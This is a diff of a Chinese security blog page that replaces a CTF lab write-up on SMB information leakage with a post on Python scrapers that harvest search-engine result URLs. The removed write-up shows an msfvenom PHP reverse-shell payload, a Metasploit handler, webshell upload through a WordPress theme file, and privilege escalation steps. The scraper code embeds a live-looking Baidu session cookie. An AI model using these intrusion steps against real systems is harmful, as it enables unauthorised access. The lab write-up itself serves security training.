@@ -21,43 +21,27 @@
     var CONFIG = {"hostname":"aqyoung.github.io","root":"/","scheme":"Muse","version":"7.7.2","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="一、SMB介绍SMB（Server Message Block）通信协议是微软（Microsoft）和英特尔（Intel）在1987年制定的协议，主要是作为Microsoft网络的通讯协议。后来Linux移植了SMB，并称为samba。">
-<meta name="keywords" content="CTF,SMB">
+  <meta name="description" content="编写各大搜索引擎的URL采集模块（baidu、bing、google）">
+<meta name="keywords" content="爬虫">
 <meta property="og:type" content="article">
-<meta property="og:title" content="CTF-SMB信息泄露">
-<meta property="og:url" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;2019&#x2F;12&#x2F;14&#x2F;CTF-SMB%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2&#x2F;index.html">
+<meta property="og:title" content="URL采集器模块">
+<meta property="og:url" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;2020&#x2F;05&#x2F;01&#x2F;URLcaiji&#x2F;index.html">
 <meta property="og:site_name" content="AqYoung">
-<meta property="og:description" content="一、SMB介绍SMB（Server Message Block）通信协议是微软（Microsoft）和英特尔（Intel）在1987年制定的协议，主要是作为Microsoft网络的通讯协议。后来Linux移植了SMB，并称为samba。">
+<meta property="og:description" content="编写各大搜索引擎的URL采集模块（baidu、bing、google）">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;smb&#x2F;smb1.png">
-<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;smb&#x2F;smb2.png">
-<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;smb&#x2F;smb3.png">
-<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;smb&#x2F;smb4.png">
-<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;smb&#x2F;smb5.png">
-<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;smb&#x2F;smb6.png">
-<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;smb&#x2F;smb7.png">
-<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;smb&#x2F;smb8.png">
-<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;smb&#x2F;smb9.png">
-<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;smb&#x2F;smb10.png">
-<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;smb&#x2F;smb11.png">
-<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;smb&#x2F;smb12.png">
-<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;smb&#x2F;smb13.png">
-<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;smb&#x2F;smb14.png">
-<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;smb&#x2F;smb18.png">
-<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;smb&#x2F;smb16.png">
-<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;smb&#x2F;smb17.png">
-<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;smb&#x2F;smb19.png">
-<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;smb&#x2F;smb20.png">
-<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;smb&#x2F;smb21.png">
-<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;smb&#x2F;smb22.png">
-<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;smb&#x2F;smb23.png">
-<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;smb&#x2F;smb24.png">
-<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;smb&#x2F;smb25.png">
-<meta property="og:updated_time" content="2020-04-07T17:39:41.752Z">
+<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;urlcj&#x2F;1.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;urlcj&#x2F;2.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;urlcj&#x2F;3.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;urlcj&#x2F;4.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;urlcj&#x2F;5.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;urlcj&#x2F;6.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;urlcj&#x2F;7.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;urlcj&#x2F;8.png">
+<meta property="og:updated_time" content="2020-05-01T03:03:41.425Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;smb&#x2F;smb1.png">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;urlcj&#x2F;1.png">
 
-<link rel="canonical" href="https://aqyoung.github.io/2019/12/14/CTF-SMB%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/">
+<link rel="canonical" href="https://aqyoung.github.io/2020/05/01/URLcaiji/">
 
 
 <script id="page-configurations">
@@ -70,7 +54,7 @@
   };
 </script>
 
-  <title>CTF-SMB信息泄露 | AqYoung</title>
+  <title>URL采集器模块 | AqYoung</title>
   
 
 
@@ -220,7 +204,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://aqyoung.github.io/2019/12/14/CTF-SMB%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/">
+    <link itemprop="mainEntityOfPage" href="https://aqyoung.github.io/2020/05/01/URLcaiji/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.png">
@@ -233,7 +217,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          CTF-SMB信息泄露
+          URL采集器模块
         </h1>
 
         <div class="post-meta">
@@ -242,23 +226,17 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
+              
 
-              <time title="创建时间：2019-12-14 17:13:34" itemprop="dateCreated datePublished" datetime="2019-12-14T17:13:34+08:00">2019-12-14</time>
+              <time title="创建时间：2020-05-01 10:03:35 / 修改时间：11:03:41" itemprop="dateCreated datePublished" datetime="2020-05-01T10:03:35+08:00">2020-05-01</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-04-08 01:39:41" itemprop="dateModified" datetime="2020-04-08T01:39:41+08:00">2020-04-08</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="fa fa-folder-o"></i>
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF%E5%A4%BA%E6%97%97%E8%AE%AD%E7%BB%83/" itemprop="url" rel="index"><span itemprop="name">CTF夺旗训练</span></a>
+                  <a href="/categories/Python/" itemprop="url" rel="index"><span itemprop="name">Python</span></a>
                 </span>
             </span>
 
@@ -271,8 +249,8 @@
       </span>
       <span class="post-meta-item-text">Valine：</span>
     
-    <a title="valine" href="/2019/12/14/CTF-SMB%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2019/12/14/CTF-SMB%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" itemprop="commentCount"></span>
+    <a title="valine" href="/2020/05/01/URLcaiji/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2020/05/01/URLcaiji/" itemprop="commentCount"></span>
     </a>
   </span>
   
@@ -287,43 +265,116 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h2 id="一、SMB介绍"><a href="#一、SMB介绍" class="headerlink" title="一、SMB介绍"></a>一、SMB介绍</h2><p>SMB（Server Message Block）通信协议是微软（Microsoft）和英特尔（Intel）在1987年制定的协议，主要是作为Microsoft网络的通讯协议。后来Linux移植了SMB，并称为samba。<a id="more"></a></p>
-<p>SMB协议是基于TCP-NETBIOS下的，一般端口使用为139，445</p>
-<p>SMB协议，计算机可以访问网络资源，下载对应的资源文件</p>
-<h2 id="二、实验环境"><a href="#二、实验环境" class="headerlink" title="二、实验环境"></a>二、实验环境</h2><p>攻击机：kali linux 192.168.43.153<br>靶场机器：192.168.43.137<br>目的：获取靶场机器的flag值</p>
-<h2 id="三、实验过程"><a href="#三、实验过程" class="headerlink" title="三、实验过程"></a>三、实验过程</h2><p><strong>1、信息探测：</strong></p>
+        <p>编写各大搜索引擎的URL采集模块（baidu、bing、google）<a id="more"></a></p>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前段时间编写了几个URL采集模块，在这里小结一下，总体来说都是利用爬虫的原理，采集各大搜索引擎的url，主要是这些规则，可能会随着时间改变而改变</p>
+<h1 id="URL采集器模块"><a href="#URL采集器模块" class="headerlink" title="URL采集器模块"></a>URL采集器模块</h1><h2 id="baidu采集模块"><a href="#baidu采集模块" class="headerlink" title="baidu采集模块"></a>baidu采集模块</h2><p>由于三个模块基本相同，而百度采集到的URL地址需要进行一个302的跳转，所以这里以百度模块来展开。</p>
+<h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><pre><code># 默认采集前10页可以在下面更改
+PAGES = 10
+
+import requests
+from lxml import etree
+from urllib.parse import quote, urlparse
+from concurrent.futures import ThreadPoolExecutor</code></pre><h3 id="开始编写采集模块"><a href="#开始编写采集模块" class="headerlink" title="开始编写采集模块"></a>开始编写采集模块</h3><pre><code>def BaiduScan(keywords):
+    result = set()
+    for i in range(0, PAGES*10, 10):
+        url = &apos;https://www.baidu.com/s?wd={}&amp;pn={}&apos;.format(quote(keywords), i)
+        print(&quot;正在采集第{}页，请耐心等待&quot;.format(int(i/10+1)))
+        try:
+            HEADERS = {
+                &apos;Accept&apos;: &apos;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&apos;,
+                &apos;Accept-Encoding&apos;: &apos;gzip, deflate, br&apos;,
+                &apos;Accept-Language&apos;: &apos;zh-CN,zh;q=0.9,en;q=0.8&apos;,
+                &apos;Cache-Control&apos;: &apos;max-age=0&apos;,
+                &apos;Connection&apos;: &apos;keep-alive&apos;,
+                &apos;Cookie&apos;: &apos;BAIDUID=832CF61CDAEF34C68E7CA06F591DF82A:FG=1; BIDUPSID=832CF61CDAEF34C68E7CA06F591DF82A; PSTM=1544962484; BD_UPN=12314753; BDUSS=RWclRJUURtR25qZWxKZWZiN0JuSlJVTWpKRjhvb3ROdmIyNnB0eEwwY2FVOWxjSVFBQUFBJCQAAAAAAAAAAAEAAADS9fNj0-~PxM600esAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABrGsVwaxrFcck; cflag=13%3A3; BDORZ=B490B5EBF6F3CD402E515D22BCDA1598; BD_HOME=1; delPer=0; BDRCVFR[feWj1Vr5u3D]=mk3SLVN4HKm; H_PS_PSSID=1453_21088_20692_28774_28720_28558_28832_28584; B64_BOT=1; BD_CK_SAM=1; PSINO=1; sug=3; sugstore=1; ORIGIN=2; bdime=0; H_PS_645EC=87ecpN5CzJjR5UwprsIowJPhqh6m9t1xGvxRkjeNmvcXBhI86ytKIjXLMhQ&apos;,
+                &apos;Host&apos;: &apos;www.baidu.com&apos;,
+                &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36&apos;,
+            }
+            HEADERS2 = {
+                &apos;Accept&apos;: &apos;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&apos;,
+                &apos;Accept-Language&apos;: &apos;zh-CN,zh;q=0.9,en;q=0.8&apos;,
+                &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36&apos;,
+            }
+            re = requests.get(url, headers=HEADERS, timeout=20)
+            text = re.content.decode(&apos;utf-8&apos;)
+            tree = etree.HTML(text)
+            # 利用xpath 
+            divs = tree.xpath(&quot;//div[@id=&apos;content_left&apos;]/div&quot;)
+            for div in divs:
+                urls = div.xpath(&quot;.//h3/a/@href&quot;)
+                # print(urls)
+                for url in urls:
+                    r = requests.get(url=url, headers=HEADERS2, timeout=20)
+                    if r.status_code == 200 or r.status_code == 302:
+                        u = urlparse(r.url)
+                        ur = u.scheme + &apos;://&apos; + u.netloc + u.path
+                        print(ur)
+                        result.add(ur)
+        except Exception as e:
+            pass
+    if result != {}:
+        for ur in result:
+            with open(&apos;baidu_url_result.txt&apos;, &apos;a+&apos;, encoding=&apos;utf-8&apos;)as a:
+                a.write(ur + &apos;\n&apos;)
+        print(&apos;搜索完成,已经保存到:&quot;baidu_url_result.txt&quot;&apos;)</code></pre><p>参数说明：</p>
+<p>1、url规则编写：</p>
+<pre><code>url = &apos;https://www.baidu.com/s?wd={}&amp;pn={}&apos;.format(quote(keywords), i)</code></pre><p>url的地址是根据百度url规则来编写的</p>
+<p><img src="/images/urlcj/1.png" alt=""></p>
+<p>通过简单的观察我们可以发现，wd就是我们要进行搜索的关键字，而pn代表的是页数（0,代表第一页，10代表第二页，20代表第三页以此类推）</p>
+<p>写一个”for i in range(0, PAGES*10, 10):”在range中以10为步长从0，PAGES 10 这样的话url的规则就编写完成了。</p>
+<p>2、xpath的规则编写：</p>
+<p>这里我用xpath来采集URL在前面都是正常的request请求。</p>
+<p><img src="/images/urlcj/2.png" alt=""></p>
+<p><img src="/images/urlcj/3.png" alt=""></p>
+<p>通过观察我们可以发现需要的数据在标红色里面，而所有的数据又在div标签并且id=’content_left’中，在得到这些数据中，我们对divs进行遍历”.//h3/a/@href”</p>
+<p><img src="/images/urlcj/4.png" alt=""><br>到这里xpath的规则就编写完成了，你可以获得一个百度跳转到其他网页的列表，下面再对这些URL进行处理</p>
+<p>3、302跳转处理：</p>
+<p>在上面获取了跳转前的链接，并不是我们需要的地址，所以还需要进一步处理<br>在进行request请求之后使用urlparse()函数获得类似下面这样的数据<br><img src="/images/urlcj/5.png" alt=""></p>
+<pre><code>ur = u.scheme + &apos;://&apos; + u.netloc + u.path</code></pre><p>最后把这些组合起来就可以了</p>
+<p>4、编写main()</p>
+<pre><code>if __name__ == &apos;__main__&apos;:
+    inp1 = input(&quot;请选择搜索模式：\n 1 :批量从文件关键字搜索\n 2 :输入一个关键字进行搜索\n&quot;)
+    if inp1 == &apos;1&apos;:
+        inp = input(&apos;导入标题文本:&apos;)
+        titles = list(set([x.strip() for x in open(inp, &apos;r&apos;, encoding=&apos;utf-8&apos;).readlines()]))
+        print(&apos;目标总数:{}&apos;.format(len(titles)))
+        with ThreadPoolExecutor(10) as p:
+            # 开 10 个线程池
+            res = [p.submit(BaiduScan, url) for url in titles]
+    elif inp1 == &apos;2&apos;:
+        url = input(&apos;输入keywords\n&apos;)
+        BaiduScan(url)
+
+    else:
+        pass</code></pre><p>使用效果：</p>
+<p><img src="/images/urlcj/6.png" alt=""></p>
+<h2 id="bing采集模块"><a href="#bing采集模块" class="headerlink" title="bing采集模块"></a>bing采集模块</h2><p>bing和baidu大同小异，所以这里就不赘述，所以这里附上URL和xpath规则</p>
+<pre><code># URL规则
+url = &apos;https://cn.bing.com/search?q={}&amp;first={}&apos;.format(quote(keywords), i)
+# xpath规则
+divs = tree.xpath(&quot;//ol[@id=&apos;b_results&apos;]/li&quot;)
+            for div in divs:
+                url = div.xpath(&quot;.//h2/a/@href&quot;)
+                print(url[0])
+                result.add(url[0])</code></pre><p>使用效果：</p>
+<p><img src="/images/urlcj/7.png" alt=""></p>
+<h2 id="google采集模块"><a href="#google采集模块" class="headerlink" title="google采集模块"></a>google采集模块</h2><p>同样的google和bing、baidu也是大同小异，不同的是google需要能够科学上网的网络，同时google的“确定你不是机器人”，可能需要进一步的绕过</p>
+<pre><code># URL规则
+url = &apos;https://www.google.com/search?q={}&amp;start={}&apos;.format(quote(keywords), i)
+# xptah规则
+divs = tree.xpath(&quot;//div[@class=&apos;g&apos;]&quot;)
+            for div in divs:
+                url = div.xpath(&quot;.//div[@class=&apos;r&apos;]/a/@href&quot;)
+                print(url[0])
+                result.add(url[0])
+# socket代理示例
+ proxies = {&quot;http&quot;: &quot;socks5://127.0.0.1:10808&quot;, &quot;https&quot;: &quot;socks5://127.0.0.1:10808&quot;, }</code></pre><p>使用效果：</p>
+<p><img src="/images/urlcj/8.png" alt=""></p>
+<hr>
+<p><strong>声明：</strong></p>
 <ul>
-<li>nmap -sV IP        挖掘开放服务信息<br><img src="/images/smb/smb1.png" alt=""></li>
-<li>nmap -A -v -T4 IP  挖掘靶场全部信息<br><img src="/images/smb/smb2.png" alt=""><br><img src="/images/smb/smb3.png" alt=""></li>
+<li>笔者初衷用于分享与交流网络知识，若读者因此作出任何危害网络安全行为后果自负，与作者无关！</li>
 </ul>
-<p><strong>2、 针对SMB协议弱点分析</strong><br><em>1.针对SMB协义，使用空口令，若口令尝试登陆，并查看敏感卡载查看；</em></p>
-<ul>
-<li><p>smbclient -L IP<br><img src="/images/smb/smb4.png" alt=""></p>
-</li>
-<li><p>smbclient \‘IP\share$’<br>尝试登陆上面的sharename结果share可以用空密码进去，并且存在敏感文件<br><img src="/images/smb/smb5.png" alt=""></p>
-</li>
-<li><p>get 敏感文件<br><img src="/images/smb/smb6.png" alt=""><br>进一步嗅探<br><img src="/images/smb/smb7.png" alt=""><br>果然有发现<br><img src="/images/smb/smb8.png" alt=""><br>尝试登陆数据库<br><img src="/images/smb/smb9.png" alt=""><br>登陆失败！！！</p>
-</li>
-</ul>
-<p><em>2.针对SMB协议远程溢出漏洞进行分析；</em><br><img src="/images/smb/smb10.png" alt=""></p>
-<ul>
-<li>searchsploit samba 版本号<br><img src="/images/smb/smb11.png" alt=""></li>
-</ul>
-<p><strong>3、针对HTTP协议弱点分析</strong><br><em>1.浏览器查看网站；</em><br><img src="/images/smb/smb12.png" alt=""></p>
-<p><em>2.使用dirb nikto探测；</em><br><img src="/images/smb/smb13.png" alt=""><br><img src="/images/smb/smb14.png" alt=""></p>
-<p><em>3.寻找突破点，目标登录后台，上传webshell；</em></p>
-<p><img src="/images/smb/smb18.png" alt=""></p>
-<p> <strong>- 制作webshell</strong></p>
-<p>msfvenom -p php/meterpreter/reverse_tcp -lhost=攻击机ip地址 Iport=4444 -f raw&gt;/root/Desktop/shell.php<br><img src="/images/smb/smb16.png" alt=""></p>
-<p> <strong>- 启动监听</strong><br>msf&gt;use exploit/multi/handler<br>msf exploift（handler）&gt;set payload php/meterpreter/reverse_tcp<br>msf exploift（handler）&gt;set lhost 攻击机IP地址<br>msf exploit（handler）&gt;set lport 4444<br>msf exploit（handler）&gt;run</p>
-<p> <strong>- 上传Webshell</strong><br>使用找到的敏感信息登录系统后台，上传webshell。执行<br>webshell（访问具有webshell的php页面）<br><img src="/images/smb/smb17.png" alt=""></p>
-<p>wordpress 上传点theme 404.php<br>执行：http:/靶场IP/wordpress/wp-content/themes/twentyfifteen/404.php<br><img src="/images/smb/smb19.png" alt=""></p>
-<p>获得反弹的shell<br><img src="/images/smb/smb20.png" alt=""></p>
-<p><strong>4、查找flag信息</strong><br>优化终端：</p>
-<pre><code>python -c&quot;import pty;pty.spawn（&apos;/bin/bash&apos;）&quot;</code></pre><p><img src="/images/smb/smb21.png" alt=""></p>
-<p>查找敏感信息，提升root权限，查看flag值。<br><img src="/images/smb/smb22.png" alt=""></p>
-<p>查找用户名：cat/etc/passwd查找密码：在共享目录下的敏感文件，提升权限<br>–su用户名<br>–sudo -l<br>–su sudo<br><img src="/images/smb/smb23.png" alt=""><br><img src="/images/smb/smb24.png" alt=""><br><em>很幸运的使用弱密码登陆了进来了</em><br><img src="/images/smb/smb25.png" alt=""></p>
-<h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><p>对于开放139和445端口的机器一定要注意是否可以直接使用smbclient登录到共享目录查找敏感文件。<br>一般情况下lag值都在/root目录下，并且需要提升root权限才能查看内容；</p>
 
     </div>
 
@@ -339,7 +390,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="https://aqyoung.github.io/2019/12/14/CTF-SMB%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" title="CTF-SMB信息泄露">https://aqyoung.github.io/2019/12/14/CTF-SMB信息泄露/</a>
+    <a href="https://aqyoung.github.io/2020/05/01/URLcaiji/" title="URL采集器模块">https://aqyoung.github.io/2020/05/01/URLcaiji/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-ND</a> 许可协议。转载请注明出处！
@@ -350,8 +401,7 @@
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/CTF/" rel="tag"># CTF</a>
-              <a href="/tags/SMB/" rel="tag"># SMB</a>
+              <a href="/tags/%E7%88%AC%E8%99%AB/" rel="tag"># 爬虫</a>
           </div>
 
         
@@ -360,13 +410,10 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2019/12/14/CTF-SSH%E7%A7%81%E9%92%A5%E6%B3%84%E9%9C%B2/" rel="prev" title="CTF-SSH私钥泄露CTF-SSH服务测试">
-      <i class="fa fa-chevron-left"></i> CTF-SSH私钥泄露CTF-SSH服务测试
+    <a href="/2020/04/30/netcat1/" rel="prev" title="socket之编写netcat（python3）">
+      <i class="fa fa-chevron-left"></i> socket之编写netcat（python3）
     </a></div>
-      <div class="post-nav-item">
-    <a href="/2019/12/14/CTF-FTP%E6%9C%8D%E5%8A%A1%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/" rel="next" title="CTF-FTP服务后门利用">
-      CTF-FTP服务后门利用 <i class="fa fa-chevron-right"></i>
-    </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
@@ -427,7 +474,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#一、SMB介绍"><span class="nav-number">1.</span> <span class="nav-text">一、SMB介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二、实验环境"><span class="nav-number">2.</span> <span class="nav-text">二、实验环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#三、实验过程"><span class="nav-number">3.</span> <span class="nav-text">三、实验过程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#四、总结"><span class="nav-number">4.</span> <span class="nav-text">四、总结</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#URL采集器模块"><span class="nav-number">2.</span> <span class="nav-text">URL采集器模块</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#baidu采集模块"><span class="nav-number">2.1.</span> <span class="nav-text">baidu采集模块</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#准备工作"><span class="nav-number">2.1.1.</span> <span class="nav-text">准备工作</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#开始编写采集模块"><span class="nav-number">2.1.2.</span> <span class="nav-text">开始编写采集模块</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bing采集模块"><span class="nav-number">2.2.</span> <span class="nav-text">bing采集模块</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#google采集模块"><span class="nav-number">2.3.</span> <span class="nav-text">google采集模块</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
